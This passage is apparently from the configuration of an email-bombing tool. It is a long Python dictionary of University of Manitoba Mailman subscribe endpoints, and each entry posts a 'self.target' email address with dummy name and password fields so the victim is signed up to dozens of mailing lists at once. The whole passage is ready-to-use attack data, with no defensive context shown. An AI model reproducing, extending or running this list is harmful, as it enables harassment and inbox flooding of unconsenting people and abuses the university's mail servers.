                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AsQmB': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mhr-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mhr-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hhkEI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mhr-thesisadvisors',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mhr-thesisadvisors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MZLCo': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mhr-thesisstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mhr-thesisstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Nnjso': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mla-exec',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mla-exec',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tmalc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mnn-faculty',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mnn-faculty',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DHqvR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mpas-class-of-2022',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mpas-class-of-2022',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zfACK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mrnet-l',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mrnet-l',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ONjDW': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/msss-mailinglist',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/msss-mailinglist',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JDQto': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mswik-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mswik-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hunTb': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ncn-contacts-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ncn-contacts-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'crOZd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/northwinds-band',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/northwinds-band',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OlHdZ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nri-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nri-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vgUiW': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nri-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nri-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SNvNP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nri-alumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nri-alumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jLjMh': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nri-grdstud',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nri-grdstud',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iGMCe': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nri-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nri-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZeLdu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-4yr-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-4yr-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZLFmV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ayqhr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-academics-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-academics-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wkLeA': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-all-employees',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-all-employees',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ueQss': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-all-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-all-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tTQBH': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-alumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-alumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NxhWM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-appt-staff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-appt-staff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ttLRw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-bprn-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-bprn-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LWtmS': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-cef',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-cef',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lLSXT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-faculty-grad',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-faculty-grad',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hXSIN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-fortgarry-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-fortgarry-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XTBEu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-gradstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-gradstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GtYli': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-mcnhr',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-mcnhr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QoHZn': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/nursing-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/nursing-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oVbUD': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ophth-faculty',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ophth-faculty',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XNlne': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ophth-grand-rounds',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ophth-grand-rounds',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QsZhi': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ophth-non-faculty',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ophth-non-faculty',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tIUqF': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ophth-office-staff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ophth-office-staff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WpIRU': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ophth-residents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ophth-residents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mptBW': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/pacs-alumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/pacs-alumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kdcKe': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/pacs-jmp',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/pacs-jmp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wvrcr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/pacs-phd',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/pacs-phd',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tNvgO': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/peg-journalclub',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/peg-journalclub',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dBtBW': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/pharmacy-3rd-year',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/pharmacy-3rd-year',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lnMdM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/pharmacy-4th-year',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/pharmacy-4th-year',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wVfjM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/pharmacy-academics-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/pharmacy-academics-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OMsln': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/pharmacy-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/pharmacy-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AXpyH': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/pharmacy-grad-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/pharmacy-grad-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pNxYl': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/phil-list',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/phil-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IoyDe': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/photo-club',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/photo-club',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rttpu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/pims-uofm',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/pims-uofm',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kQimt': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/presidents-scholars-new-2020-2021',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/presidents-scholars-new-2020-2021',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'naaYV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/presidents-scholars-returning-2020-2021',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/presidents-scholars-returning-2020-2021',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ESXrR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/psych-leboelab',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/psych-leboelab',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tPMXZ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/red-lion',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/red-lion',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fnyXJ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/rehab-academics-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/rehab-academics-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FCMOc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/rep-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/rep-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cMxlD': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/rfhs-grad-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/rfhs-grad-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AYjBo': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/riddell-faculty-adjunct',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/riddell-faculty-adjunct',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AqKmc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/riddell-faculty-alumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/riddell-faculty-alumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BpPrB': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/riddell-faculty-graduate-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/riddell-faculty-graduate-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'awzwQ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/riddell-faculty-international-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/riddell-faculty-international-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UXcVg': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/riddell-faculty-support-staff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/riddell-faculty-support-staff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'syAPC': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/riddell-faculty-teaching-staff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/riddell-faculty-teaching-staff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZpMQG': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/riddell-faculty-undergraduate-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/riddell-faculty-undergraduate-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NzIKp': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/riddell-non-faculty',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/riddell-non-faculty',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bDMzz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/rm-ehs-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/rm-ehs-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ksfno': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ro-teaching-staff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ro-teaching-staff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UifJc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/school-of-art-gallery',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/school-of-art-gallery',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IfgeN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-biosci-adjunct',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-biosci-adjunct',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KJsQE': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-biosci-council',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-biosci-council',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uOiJH': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-biosci-grads-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-biosci-grads-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BVmgA': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-biosci-others',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-biosci-others',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xGqfo': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-biosci-seminars',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-biosci-seminars',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qMpqC': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kAIgx': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-adjuncts',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-adjuncts',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EuVId': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fKbgu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-chemclub',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-chemclub',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tbEyQ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-grad-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-grad-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SroAh': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-labinstructors',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-labinstructors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZAeAn': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-newsletter',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-newsletter',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vqmBW': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-others',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-others',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bxWqa': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-posting',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-posting',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QybhK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-retired',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-retired',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DkCdN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-chemistry-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-chemistry-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
